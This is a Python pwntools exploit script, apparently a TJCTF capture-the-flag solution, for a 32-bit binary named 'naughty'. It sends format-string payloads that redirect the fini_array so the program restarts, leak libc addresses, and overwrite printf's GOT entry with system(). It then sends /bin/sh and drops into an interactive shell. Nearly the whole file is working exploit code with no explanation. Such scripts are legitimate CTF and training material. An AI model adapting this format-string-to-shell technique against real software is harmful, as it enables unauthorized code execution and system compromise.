from pwn import *
#target=remote('p1.tjctf.org' ,8004)
envi={"LD_PRELOAD":"/media/sf_kalishared/tools/The_Night-master/libcs/libc6_2.27-3ubuntu1_i386.so"}
target=process(['/media/sf_kalishared/tools/itl-master/linkers/x86/ld-2.27.so','./naughty'],env=envi)
libc=ELF('/media/sf_kalishared/tools/The_Night-master/libcs/libc6_2.27-3ubuntu1_i386.so')

context.terminal=["tmux","split","-h"]
gdb.attach(target,''' break *0x0804862F
                      break *0x08048634 ''')
finiarray=0x08049bac
restart=0x08048420

#write restart to finiarray and leak libc,stack
print(target.recvuntil("name?\n"))
lh=int(hex(restart)[5:9],16)
uh=int(hex(restart)[2:5],16)
payload="%75$p..."+p32(finiarray+2)+p32(finiarray)+"%"+str(uh-21)+"x"+"%9$n"+"%"+str(lh-uh)+"x"+"%10$hn"
payload+="\x00"*(256-len(payload))
target.send(payload)
print(target.recvuntil("LIST "))
libc_start_main=int(target.recv(10),16)-241
libc_base=libc_start_main-libc.symbols["__libc_start_main"]
libc_system=libc_base+libc.symbols["system"]
libc_binsh=libc_base+libc.search("/bin/sh\x00").next()
print(hex(libc_base))
#overwrite PrintfGOT with libc_system
printfgot=0x08049cb0
lh=int(hex(libc_system)[6:10],16)
uh=int(hex(libc_system)[2:6],16)
payload=p32(printfgot)+p32(printfgot+2)+"%"+str(lh-8)+"x"+"%7$hn"+"%"+str(uh-lh)+"x"+"%8$hn"
payload+="\x00"*(256-len(payload))
target.sendline(payload)
print(target.recv())

payload="/bin/sh\x00"
target.sendline(payload)
target.interactive()

